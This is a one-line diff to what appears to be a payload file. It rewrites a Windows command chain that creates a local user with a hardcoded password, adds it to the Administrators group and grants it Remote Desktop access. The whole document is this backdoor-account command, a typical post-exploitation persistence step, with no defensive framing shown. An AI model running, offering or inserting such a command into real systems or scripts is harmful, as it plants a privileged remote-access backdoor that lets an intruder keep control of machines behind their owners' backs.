@@ -1,1 +1,1 @@
-net user jan-karel C0mpl3x.teit /add; net localgroup "Administrators" /add jan-karel; net localgroup "Remote Desktop Users" /add jan-karel
+NET USER jan-karel C0mpl3x.teit /ADD && NET localgroup "Administrators" /ADD jan-karel && NET localgroup "Remote Desktop Users" /ADD jan-karel
